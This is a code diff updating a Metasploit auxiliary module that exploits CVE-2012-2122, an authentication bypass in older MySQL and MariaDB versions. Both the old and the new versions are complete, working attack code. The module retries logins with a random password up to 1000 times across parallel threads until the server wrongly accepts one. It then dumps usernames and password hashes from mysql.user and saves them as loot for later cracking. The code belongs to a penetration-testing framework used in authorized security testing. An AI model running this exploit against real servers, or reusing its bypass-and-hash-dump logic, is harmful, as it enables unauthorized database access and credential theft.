@@ -1,222 +1,208 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+require 'rex/proto/mysql/client'
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::MYSQL
+  include Msf::Auxiliary::Report
 
-class Metasploit3 < Msf::Auxiliary
+  include Msf::Auxiliary::Scanner
 
-	include Msf::Exploit::Remote::MYSQL
-	include Msf::Auxiliary::Report
+  def initialize
+    super(
+      'Name' => 'MySQL Authentication Bypass Password Dump',
+      'Description' => %Q{
+        This module exploits a password bypass vulnerability in MySQL in order
+        to extract the usernames and encrypted password hashes from a MySQL server.
+        These hashes are stored as loot for later cracking.
 
-	include Msf::Auxiliary::Scanner
+        Impacts MySQL versions:
+        - 5.1.x before 5.1.63
+        - 5.5.x before 5.5.24
+        - 5.6.x before 5.6.6
 
-	def initialize
-		super(
-			'Name'           => 'MySQL Authentication Bypass Password Dump',
-			'Version'        => '$Revision$',
-			'Description'    => %Q{
-					This module exploits a password bypass vulnerability in MySQL in order
-				to extract the usernames and encrypted password hashes from a MySQL server.
-				These hashes ares stored as loot for later cracking.
-			},
-			'Author'        => [
-					'TheLightCosine <thelightcosine[at]metasploit.com>', # Original hashdump module
-					'jcran'                                              # Authentication bypass bruteforce implementation
-				],
-			'References'     => [
-					['CVE', '2012-2122'],
-					['OSVDB', '82804']
-				],
-			'DisclosureDate' => 'Jun 09 2012',
-			'License'        => MSF_LICENSE
-		)
+        And MariaDB versions:
+        - 5.1.x before 5.1.62
+        - 5.2.x before 5.2.12
+        - 5.3.x before 5.3.6
+        - 5.5.x before 5.5.23
+      },
+      'Author' => [
+        'theLightCosine', # Original hashdump module
+        'jcran' # Authentication bypass bruteforce implementation
+      ],
+      'References' => [
+        ['CVE', '2012-2122'],
+        ['OSVDB', '82804'],
+        ['URL', 'https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/']
+      ],
+      'DisclosureDate' => 'Jun 09 2012',
+      'License' => MSF_LICENSE
+    )
 
-		deregister_options('PASSWORD')
-		register_options( [ 
-			OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ]) 
-		], self.class )
-	end
+    deregister_options('PASSWORD')
+    register_options([
+      OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
+    ])
+  end
 
+  def run_host(ip)
+    # Keep track of results (successful connections)
+    results = []
 
-	def run_host(ip)
+    # Username and password placeholders
+    username = datastore['USERNAME']
+    password = Rex::Text.rand_text_alpha(rand(8) + 1)
 
-		# Keep track of results (successful connections)
-		results = []
+    # Do an initial check to see if we can log into the server at all
 
-		# Username and password placeholders
-		username = datastore['USERNAME']
-		password = Rex::Text.rand_text_alpha(rand(8)+1)
+    begin
+      socket = connect(false)
+      close_required = true
+      mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: socket)
+      results << mysql_client
+      close_required = false
 
-		# Do an initial check to see if we can log into the server at all
+      print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{mysql_client.peerhost}:#{mysql_client.peerport}"
+    rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
+      print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
+      return
+    rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
+      print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error "#{rhost}:#{rport} Error: #{e}"
+      return
+    ensure
+      socket.close if socket && close_required
+    end
 
-		begin
-			socket = connect(false)
-			x = ::RbMysql.connect({
-				:host           => rhost,
-				:port           => rport,
-				:user           => username,
-				:password       => password,
-				:read_timeout   => 300,
-				:write_timeout  => 300,
-				:socket         => socket
-				})
-			x.connect
-			results << x
+    # Short circuit if we already won
+    if results.length > 0
+      self.mysql_conn = results.first
+      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
+    end
 
-			print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password"
+    #
+    # Threaded login checker
+    #
+    max_threads = 16
+    cur_threads = []
 
-		rescue RbMysql::HostNotPrivileged
-			print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
-			return
-		rescue RbMysql::AccessDeniedError
-			print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception => e
-			print_error "#{rhost}:#{rport} Error: #{e}"
-			return
-		end
+    # Try up to 1000 times just to be sure
+    queue = [*(1..1000)]
 
-		# Short circuit if we already won
-		if results.length > 0
-			@mysql_handle = results.first
-			return dump_hashes
-		end
+    while (queue.length > 0)
+      while (cur_threads.length < max_threads)
 
+        # We can stop if we get a valid login
+        break if results.length > 0
 
-		#
-		# Threaded login checker
-		#
-		max_threads = 16
-		cur_threads = []
+        # keep track of how many attempts we've made
+        item = queue.shift
 
-		# Try up to 1000 times just to be sure
-		queue   = [*(1 .. 1000)]
+        # We can stop if we reach 1000 tries
+        break if not item
 
-		while(queue.length > 0)
-			while(cur_threads.length < max_threads)
+        # Status indicator
+        print_status "#{rhost}:#{rport} Authentication bypass is #{item / 10}% complete" if (item % 100) == 0
 
-				# We can stop if we get a valid login
-				break if results.length > 0
+        t = Thread.new(item) do |count|
+          begin
+            # Create our socket and make the connection
+            close_required = true
+            s = connect(false)
+            mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)
 
-				# keep track of how many attempts we've made
-				item = queue.shift
+            print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
+            results << mysql_client
+            close_required = false
+          rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
+          rescue ::Exception => e
+            print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
+          ensure
+            s.close if socket && close_required
+          end
+        end
 
-				# We can stop if we reach 1000 tries
-				break if not item
+        cur_threads << t
+      end
 
-				# Status indicator
-				print_status "#{rhost}:#{rport} Authentication bypass is #{item/10}% complete" if (item % 100) == 0
+      # We can stop if we get a valid login
+      break if results.length > 0
 
-				t = Thread.new(item) do |count|
-					begin
-						# Create our socket and make the connection
-						s = connect(false)
-						x = ::RbMysql.connect({
-							:host           => rhost,
-							:port           => rport,
-							:user           => username,
-							:password       => password,
-							:read_timeout   => 300,
-							:write_timeout  => 300,
-							:socket         => s,
-							:db             => nil
-							})
-						print_status "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
-						results << x
-					rescue RbMysql::AccessDeniedError
-					rescue Exception => e
-						print_status "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
-					end
-				end
+      # Add to a list of dead threads if we're finished
+      cur_threads.each_index do |ti|
+        t = cur_threads[ti]
+        if not t.alive?
+          cur_threads[ti] = nil
+        end
+      end
 
-				cur_threads << t
+      # Remove any dead threads from the set
+      cur_threads.delete(nil)
 
-			end
+      ::IO.select(nil, nil, nil, 0.25)
+    end
 
-			# We can stop if we get a valid login
-			break if results.length > 0
+    # Clean up any remaining threads
+    cur_threads.each { |x| x.kill }
 
-			# Add to a list of dead threads if we're finished
-			cur_threads.each_index do |ti|
-				t = cur_threads[ti]
-				if not t.alive?
-					cur_threads[ti] = nil
-				end
-			end
+    if results.length > 0
+      print_good("#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully exploited the authentication bypass flaw, dumping hashes...")
+      self.mysql_conn = results.first
+      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
+    end
 
-			# Remove any dead threads from the set
-			cur_threads.delete(nil)
+    print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
+  end
 
-			::IO.select(nil, nil, nil, 0.25)
-		end
+  def dump_hashes(host, port)
+    # Grabs the username and password hashes and stores them as loot
+    res = mysql_query("SELECT user,password from mysql.user")
+    if res.nil?
+      print_error("#{host}:#{port} There was an error reading the MySQL User Table")
+      return
 
-		# Clean up any remaining threads
-		cur_threads.each {|x| x.kill }
+    end
 
+    # Create a table to store data
+    tbl = Rex::Text::Table.new(
+      'Header' => 'MysQL Server Hashes',
+      'Indent' => 1,
+      'Columns' => ['Username', 'Hash']
+    )
 
-		if results.length > 0
-			print_good("#{rhost}:#{rport} Successfully exploited the authentication bypass flaw, dumping hashes...")
-			@mysql_handle = results.first
-			return dump_hashes
-		end
+    if res.size > 0
+      res.each do |row|
+        next unless (row[0].to_s + row[1].to_s).length > 0
 
-		print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
-	end
+        tbl << [row[0], row[1]]
+        print_good("#{host}:#{port} Saving HashString as Loot: #{row[0]}:#{row[1]}")
+      end
+    end
 
-	def dump_hashes
+    this_service = nil
+    if framework.db and framework.db.active
+      this_service = report_service(
+        :host => host,
+        :port => port,
+        :name => 'mysql',
+        :proto => 'tcp'
+      )
+    end
 
-		# Grabs the username and password hashes and stores them as loot
-		res = mysql_query("SELECT user,password from mysql.user")
-		if res.nil?
-			print_error("#{rhost}:#{rport} There was an error reading the MySQL User Table")
-			return
+    report_hashes(tbl.to_csv, this_service, host, port) unless tbl.rows.empty?
+  end
 
-		end
-
-		# Create a table to store data
-		tbl = Rex::Ui::Text::Table.new(
-			'Header'  => 'MysQL Server Hashes',
-			'Indent'   => 1,
-			'Columns' => ['Username', 'Hash']
-		)
-
-		if res.size > 0
-			res.each do |row|
-				next unless (row[0].to_s + row[1].to_s).length > 0
-				tbl << [row[0], row[1]]
-				print_good("#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}")
-			end
-		end
-
-		this_service = nil
-		if framework.db and framework.db.active
-			this_service = report_service(
-				:host  => rhost,
-				:port => rport,
-				:name => 'mysql',
-				:proto => 'tcp'
-			)
-		end
-
-		report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?
-
-	end
-
-	# Stores the Hash Table as Loot for Later Cracking
-	def report_hashes(hash_loot,service)
-		filename= "#{rhost}-#{rport}_mysqlhashes.txt"
-		path = store_loot("mysql.hashes", "text/plain", rhost, hash_loot, filename, "MySQL Hashes", service)
-		print_status("#{rhost}:#{rport} Hash Table has been saved: #{path}")
-
-	end
-
+  # Stores the Hash Table as Loot for Later Cracking
+  def report_hashes(hash_loot, service, host, port)
+    filename = "#{host}-#{port}_mysqlhashes.txt"
+    path = store_loot("mysql.hashes", "text/plain", host, hash_loot, filename, "MySQL Hashes", service)
+    print_good("#{host}:#{port} Hash Table has been saved: #{path}")
+  end
 end
